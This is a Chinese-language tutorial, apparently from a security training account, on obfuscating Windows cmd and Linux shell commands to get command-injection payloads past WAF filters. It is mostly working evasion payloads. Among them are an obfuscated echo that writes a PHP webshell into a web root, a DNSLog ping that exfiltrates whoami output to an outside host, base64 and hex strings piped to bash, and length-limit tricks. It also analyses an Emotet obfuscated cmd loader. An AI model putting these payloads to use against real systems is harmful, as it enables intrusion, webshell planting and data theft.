#  绕过WAF运行命令执行漏洞的方法  
 蚁景网安   2026-04-21 08:30  
  
0x01 Windows（不区分大小写）  
  
1.1 符号和命令的关系  
  
如果命令执行的时候遇到拦截命令关键词的时候可以利用如下方法绕过：  
  
  
"  
和^  
是CMD命令中最常见的转义字符，还有成对的括号并不会影响命令的执行。  
  
  
这里有几个需要注意的地方：  
```
在命令中可以有无数个"，但是不能有两个连续的^
在命令中如果"在^之前，则"的个数必须为偶数个
在命令中如果"在^之后，并且带有参数，则命令中的"个数必须为偶数
在命令的参数中，单个字符前后"的个数只能有一个或者两个
如果成对的括号中间有"则"的个数也必须为偶数
```  
```
whoami    //正确执行
WhOAmi    //正确执行
Who"amI    //正确执行
((Who"amI))    //错误
((Who""amI))    //正确执行
Who""""""""amI    //正确执行
who"""a^mi    //错误
who""""a^mi    //正确执行
whoa^m""""i    //正确执行
whoa^m"""i    //正确执行
whoa^^mi    //错误
n^e^t user    //正确执行
n^e^t"" user    //正确执行
n^e^t""" user    //错误
n^e^t"" u"ser    //正确执行
n^e^t"" u""ser    //正确执行
n^e^t"" u"""ser    //错误
n^e^t"" u""s"er    //正确执行
n^e^t"" u""s""er    //正确执行
n^e^t"" u""s"""er    //错误
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAicNKsm8OvN6UJUlLiaMfTKqZrKEhibrQ21Rib1RLibeV7zVibdsXFmB2Ga5g/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAIDETUpRLY8zGMHS8xmnRIsX82mksF0dVf7E0fWMujCjYOBXeqkC8uw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAoHBYFxInJOmiaZialyzdMiaosNfPIcvVgwZrYlVdLAuUQYO46GyiaFJ6Bg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAP4vicaXCWroBMGNjVSbGyO2icMtLyAIcb7HyCtMXLr4Ku3cMUSv4l04Q/640?wx_fmt=png "")  
  
1.2 了解set命令和Windows变量  
  
在cmd中set用来进行变量赋值，而%%括起来的变量会引用其赋的值。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAo2hOAgvjQCiawOGCUXE8NVDSpqA1SU6icoeMA57oZU0m9ZROIztJAvfg/640?wx_fmt=png "")  
  
这样就可以进行命令执行了  
```
set cmd=whoami    //赋值变量为whoami
%cmd%              //执行命令
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA0LB5ddJMqFYP0aMVmq4ge6P2MQUrPrLz6rhWTibXkYDoXn9SYX9zODg/640?wx_fmt=png "")  
  
也可以赋值多个变量，拼接利用  
```
set cmd1=who
set cmd2=am
set cmd3=i
%cmd1%%cmd2%%cmd3%
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDArN6p9ibfSToU9pkIxicZNRGxfNeYwTlMNP7icNZVaqAQzYuScNDjZkbpA/640?wx_fmt=png "")  
  
```
set cmd1=who
set cmd3=i
%cmd1%am%cmd3%
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA1ayFtibNWWK3RlkPgicXU63tkd9LxictrySH0Gvs7PQSgvIIicTuvOtoSg/640?wx_fmt=png "")  
  
也可以与1.2的内容进行合并  
```
set cmd1=wh""o
set cmd3=i"""
%cmd1%a^m%cmd3%
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA2TLiciagKYAa0HwZfTgR7JSkkW40EhgloVaIDH1LgkkklZAPZXR5W5LA/640?wx_fmt=png "")  
  
也可以在赋值的时候加入空格  
```
set cmd1=s""er
set cmd2=t u
set cmd3=n^e
%cmd3%%cmd2%%cmd1%
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAnEw09POz1NpcCQ7viapX0k9mNjMOVxmY8CPNE7pw1Ricv81fd0KOX7icg/640?wx_fmt=png "")  
```
Cmd /C "set cmd1=s""er && set cmd2=t u && set cmd3=n^e && call %cmd3%%cmd2%%cmd1%"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA7PN5eXz4Hj7UfQWlibL3o4IuH4mVT4uUCztfXfP9v5GwKnicCry1k7kA/640?wx_fmt=png "")  
  
当使用cmd /V:ON  
或cmd /V:O  
时可以不使用call命令来扩展变量，使用 %var% 或 !var! 来扩展变量，!var!可以用来代替%var%  
```
cmd /V:ON /C "set cmd=net user && !cmd!"
cmd /V:O /C "set cmd=net user && !cmd!"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAibOqJPCqEQlzA9qiamyTOHVkpG1GCAcLjKxEgDsuf4zfKt6bfkmWv6yA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAqtibwOkeZoIKQMER8j9GxvW1J7nC8qrSzxgunWq7Nc6VVxhv3VmqjQg/640?wx_fmt=png "")  
  
1.3 Windows切割字符串  
  
拿whoami举例，实践Windows切割字符串的语法  
```
set cmd=whoami

%cmd:~0% //取出a的值中的所有字符此时正常执行whoami
%cmd:~0,1% //取出a的值，从第0个位置开始，取1个值此时因为w总共就1个字符
%cmd:~0,6% //取出a的值，从第0个位置开始，取6个值此时因为whoami总共就6个字符
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAS9vG0ibYAZdpy6VKsE6wvJ2BHHwJwuJoYCBFoziboRruwuvk8rm8cgUg/640?wx_fmt=png "")  
  
由此可以看出来截取字符串的语法为%变量名:~x,y%  
即从变量第x位开始，截取y个字符。  
```
C:\Users\a>set str=0123456789

C:\Users\a>echo %str:~-1%
9
从最后1位开始取整个字符串
C:\Users\a>echo %str:~-6%
456789
从倒数第6位开始取整个字符串
C:\Users\a>echo %str:~-9%
123456789
从倒数第9位开始取整个字符串
C:\Users\a>echo %str:~-9,2%
12
从倒数第9位开始取2位
C:\Users\a>echo %str:~-9,4%
1234
从倒数第9位开始取4位
C:\Users\a>echo %str:~-9,-2%
1234567
从倒数第9位开始少取最后2位
C:\Users\a>echo %str:~-9,-4%
12345
从倒数第9位开始少取最后4位
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAgptH94OSibkr73opl3nkM47tMymr4zDHibXgBj5OVHpRySrT3tVrBCbg/640?wx_fmt=png "")  
  
既然已经熟悉了如何切割字符，那么我们来看一下都有什么环境变量可以用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAmPcYkAlsyhSSqNzib75LVm5b0p8rnm3CNCR7WLmZL12x37YVaMhiaSdw/640?wx_fmt=png "")  
  
我们可以拼命令了  
```
C:\Users\a>echo %COMPUTERNAME:~0,1%h%windir:~-3,1%%HOMEPATH:~-1%mi
Whoami

C:\Users\a>%COMPUTERNAME:~0,1%h%windir:~-3,1%%HOMEPATH:~-1%mi
win-tbucg5qo47j\a

C:\Users\a>d^i^r%CommonProgramFiles:~10,1%%commonprogramfiles:~0,3%
 驱动器 C 中的卷没有标签。
 卷的序列号是 5CE5-9A63

 C:\ 的目录

2022/03/1200:20    <DIR>          JspStudy
2022/07/09  20:04    <DIR>          MailMasterData
2009/07/1411:20    <DIR>          PerfLogs
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDALMLf8MC7300lXujw6IeicYvLn0pFCPfFNLKA0H5yApFC9nvCiafbFsHA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAyBicAPFoFIo1L6KMNpR5JWhPpNhzNoL4kMCkZhE8xpR5JTbaONGiaRYA/640?wx_fmt=png "")  
  
我们还可以凑php一句话（这里为了方便所以自定义了一些字符）  
```
C:\Users\a>set web=^<^>/@$_PHPOST[]?'e()val
C:\Users\a>echo ^%web:~0,1%^%web:~-8,1%%web:~6,3% ^%web:~-6,1%^%web:~-3,3%^%web:~-5,1%%web:~4,2%%web:~8,5%^%web:~-7,1%%web:~-1,1%^%web:~-7,1%%web:~13,1%^%web:~-4,1% ^%web:~-8,1%^%web:~1,1% > C:\phpstudy_pro\WWW\b.php
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAwlZsh1R0nogZXTib9F22ibb6ic4PMmyyT3b2f2QQY5uxylJbDtcsJLnpw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6uDENZWHmMNDrFHMcAibgKbSdIhn2Bl9jET8Hu8JtjkB8CEF5bm1T5A/640?wx_fmt=png "")  
  
因为拼接字符需要得到大量的位置，为了方便拼接可以使用for命令来讲所有位置设成一个列表，以此循环遍历列表，合并字符串，还能起到混淆的作用。  
  
这里注意set不能以空格结尾否则，变量会将空格进行赋值  
```
cmd /V:ON /C " set kpx=vwchdoaadmei&& for %G in (1,3,5,7,9,11,26) doset lq=!lq!!kpx:~%G,1!&& if %G==26  !lq:~4!"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAhnVFP8Ywrnk2QIZsiaZfFkkudO3iaYO6AWgm3aVjek8PZIlsyYYInTfQ/640?wx_fmt=png "")  
  
**错误示范**  
  
下面的方法拼接出来的其实是w h o a m i 因为有空格后面的都视作参数没有显示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAIO5Lj5XibulTFopjlZ9CumbboicdO4BjrLypibpa8HTStIDyian7y6HQnw/640?wx_fmt=png "")  
### 分析Emotet木马中的cmd命令  
  
Emotet一款著名的银行木马，首次出现于2014年年中。该木马主要通过垃圾邮件的方式传播感染目标用户，其不断变化传播花样，采用越来越复杂的混淆编码来躲避检测。  
  
现在我们以Emotet木马为例，我们来试着分析一下经过混淆后的cmd内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDApPFenjgjOmpS5U4NbLBZq0cPticldJKaTUG2yUlZnqOibUfnDCAsJ1Sg/640?wx_fmt=png "")  
  
先将混淆cmd命令中的转义字符“^”全部去掉，再将除了变量@之外的逗号“,”、分号“;”、多余空格删除。注意保留变量@中的逗号和分号，否则影响输出结果。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDASlTK5MSlVRvl4jCu1fwRNGdPnywBTeVpTJbPLyiaAXSyE9C9wOeh0tg/640?wx_fmt=png "")  
  
  
下图为无意义的四个字符串，cmd会自动忽略。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAV4UwFsL7k2qJwSu0MDY31ssus0dXnR1lnbTZ9yvPZPouJSrXRwic0nw/640?wx_fmt=png "")  
  
可以看出这里利用了cmd的系统环境变量%comspec%  
，即是cmd.exe的执行路径，因此会执行cmd命令，这里才是命令的真正开头。因此程序开头可以进行化简。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAs1FsIOcNKHxUF0qvooxzgxsd2UUpXsHoHHG0u0aHUooA7TQ0FkicdWw/640?wx_fmt=png "")  
  
去除无意义的字符串后可以化简为  
```
%comspec% /c for /f " delims=vf= tokens=2" %f in ( 'assoc .cmd' ) do %f /V /R
```  
  
先利用%comspec% /c  
执行第一个for循环，再利用for  
循环的/f  
参数，在命令assoc .cmd  
结果.cmd=cmdfile  
中以字符v、f、=为分隔符，取第二列即是“cmd  
”。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAghx2dbKHqenTlC2TcgKBDf8VcLxmOqyicIHvKAqvMSroIhicj98EKpibw/640?wx_fmt=png "")  
  
因此这里用for循环生成的cmd又开启了新一个cmd程序来运行下面的字符串内的程序。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAuhAGBDAuNI1sGTTKR3nVbOFmzibnQ8XuD5wz8MnIFoZicAMwMV9tCkOg/640?wx_fmt=png "")  
  
这里自定义了一个环境变量@  
，等于一个1460长度的字符串。然后利用for循环的/L参数，遍历变量@  
：for /L %s in (1459,-4,+3 ) do set \=!\!!@ :~ %s, 1!& if %s equ 3 call %\:~-365%  
，这个for循环自定义了环境变量"\  
"，还启用了延迟的环境变量扩展!  
，!@:~%s,1!  
表示循环变量%s  
从1459开始，步长为-4  
，到3  
结束，循环提取变量@  
中的字符，添加到\  
变量中。当%s  
到3  
的时候就会执行\  
中倒数365个字符组成的程序。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6BaBFArsUsqXicNzFtBCuibNjxwhyNVeo0lth4q6YJRhLHqPosXrpoHA/640?wx_fmt=png "")  
  
##   
## 1.4 逻辑运算符在绕过中的作用  
  
|  
 在cmd中，可以连接命令，且只会执行后面的命令  
```
whoami | ping -n 1 www.baidu.com   //只执行ping
ping -n 1 www.baidu.com | whoami   //只执行whoami
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAib3eMxxDO6qfz5cmjMhAh8zgUk3vKtT0ZLuGaFJAJ4VbXbtubWfxFmg/640?wx_fmt=png "")  
  
||  
 只有在前面命令失败才执行后面  
```
ping 127.0.0.1 || whoami //不执行whoami
ping xxx. || whoami //执行whoami
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAGXVx4htWaX8MOGadb2hOHcicXgFicNDFUpUaNMibDQY9ffv5KhAjUPXHg/640?wx_fmt=png "")  
  
&  
无论前面的命令是否能执行成功都会执行后面的命令  
```
ping 127.0.0.1 & whoami //执行whoami
ping xxx. & whoami //执行whoami
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAbZFEKpbfib8ggpzZVaaElgetZenoHPYibbgIFgCTZEQrSRibe1dpOkghA/640?wx_fmt=png "")  
  
&&  
前面命令为真才会执行后面的命令。  
```
ping 127.0.0.1 && whoami //执行whoami
ping xxx. && whoami //不执行whoami
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDATrsxBpFIwU453O4Lj2mYQu0ghdQhGICAibGjMTldNRnopD8JxL2FibLw/640?wx_fmt=png "")  
  
  
**0x02 Linux（区分大小写）**  
  
2.1 linux下的符号和逻辑运算符  
  
linux中变量使用$  
来引用，;  
表示命令结束无论命令是否执行成功都会执行下一个命令，| || & &&  
，与Windows一样，这里就不做赘述。  
  
  
利用上面的符号可以进行拼接的命令：  
```
t=l;j=s;i=" -al";$t$j$i
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDANcXvdvFb6j5rHa2a3bEujbnJgiaibgObrCMSO8rJibgFU546BnlFHSgrg/640?wx_fmt=png "")  
## 2.2 利用未被过滤的命令  
  
假设有命令执行漏洞的网站中过滤的一些命令，但是没有过滤一些命令，例如ping命令，则可以利用ping命令来执行命令带出信息。  
```
ping `whoami`.whjtmh.dnslog.cn
```  
  
利用DNSLog就可以获得带出的信息（对于不回显的命令执行也可以利用这种方法）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAym5hbSicXvL2BRiaAibBIBsp01QFu4ic0sib9zCUdYbwbUCf1MP3ms4270Q/640?wx_fmt=png "")  
## 2.3 linux符号之间的组合  
  
类似于Windows的"  
和^  
linux也有类似的使用方法，就是利用变量和参数  
  
  
**利用反斜杠绕过**  
```
who\ami
```  
  
**利用括号括起来（当做命令执行）**  
```
(whoa''mi)
```  
  
**利用反引号或$和括号结合（将括号内命令的结果当做命令执行）**  
```
`(echo whoami)`
$(echo whoami)
```  
  
**利用Shell特殊变量绕过**  
```
who$*ami
who$@ami
who$1ami
```  
  
**利用通配符匹配唯一命令名称执行命令（使用命令的绝对路径）**  
```
/u?r/b?n/who?mi
/*/*/whoam?
/*/*i[n]/wh??mi
```  
  
**综合组合**  
```
/*/*""in/w'h'`dfds`??m$(sdf)i
```  
  
## 2.4 linux切割字符串（linux区分大小写）  
  
在linux中切割字符串的语法是${NAME:start:length}  
  
与Windows相同这里不在赘述，只要区分大小写就可以  
  
## 2.5 绕过空格过滤  
### 在前端页面中可以利用%00,%0a,%0d等url编码来绕过空格的过滤，  
###   
### 利用大括号来绕过空格限制  
```
{ls,-al}
{ping,-c,2,127.0.0.1}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAlewLe6MhQ3jwEibx7xia9Qjva7b8a6ibG1Ogd8CHvxXNFMKCsVdmSicRmw/640?wx_fmt=png "")  
### ${IFS}绕过空格  
  
IFS是internal field separator的缩写，shell的特殊环境变量。shell根据IFS存储的值，可以是空格（040）、tab（011）、换行符（012）或者其他自定义符号，来解析输入和输出的变量值。这里echo -n是不进行自动换行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAsDiaqTYPO5oZHEVtvSORgXxD1YY8OwvzaicZHpVqicW3vOjQvkLAxc1FA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA93kRHZJujhAc10zNhGlQg9Bt4Gj5LU4VgByMuIDmnhC72gua0RATVQ/640?wx_fmt=png "")  
  
  
2.6 利用base64绕过命令限制  
```
echo whoami|base64 //先输出whoami的base64编码
`echo dwhvYW1pCg==|base64 -d` //将其base64解码
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6hz2deFGTib0PPtt2WzkFMNllicCiaYGB6xDDBsibnDbqJyiaick1MTq7jIw/640?wx_fmt=png "")  
## 2.7 hex编码绕过  
```
# cat flag.php -> 63617420666c61672e706870
echo"63617420666c61672e706870"|xxd -r -p|bash
#xxd: 二进制显示和处理文件工具,cat: 以文本方式ASCII显示文件
#-r参数：逆向转换。将16进制字符串表示转为实际的数
#-ps参数：以 postscript的连续16进制转储输出，也叫做纯16进制转储。
#-r -p将纯十六进制转储的反向输出打印为了ASCII格式。

cat flag.php -> \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70
#经测试，发现在php的ping环境上执行失败。在linux系统上执行成功
$(printf"\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70")
{printf,"\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"}|bash
`{printf,"\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"}`
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAdMib5bhRgCaibL5dibgf00ichGgSHYpp4NuDllUiaU1N4QNlVRvNpfZ1WlA/640?wx_fmt=png "")  
  
## 2.8 长度限制绕过  
### 方法一：  
  
可以利用base64解码的方式将脚本写入多个文件合并后再执行  
```
echo"cat flag.txt" | base64   # 首先生成所需命令的base64字符串

# Y2F0IGZsYWcudHh0Cg==
echo-n Y2F0IG > a
echo-n ZsYWcu >b
echo-n dHh0Cg== > c

下面合并文件

catb >> a
catc >> a

解码文件

base64-d a > shell.sh
shshell.sh
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAD3FClyNFl6stkujd7iaicbb4HFcUJtibWCtwOCP3iage4zcmopdVSdWYqg/640?wx_fmt=png "")  
  
### 方法二：  
```
首先通过命令创建带有命令分隔的文件
>"txt"
>"ag.\\"
>"fl\\"
>"t \\"
>"ca\\"
在用ls -t输出到一个文件中，再利用sh执行
ls -t > shell2.sh
#如果创建空文件时，创建了点.开头的文件，上边命令要添加-a选项将隐藏文件也写入qwzf，即
ls -at > shell2.sh
sh shell2.sh
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA7Wyk3S43efk4SEDLkPtDiao9DCaicbwSFd2pB6aiaEAf3ERg2XLAmwStQ/640?wx_fmt=png "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=15 "")  
  
学  
习  
网安实战技术  
，戳  
“阅读原文”  
  
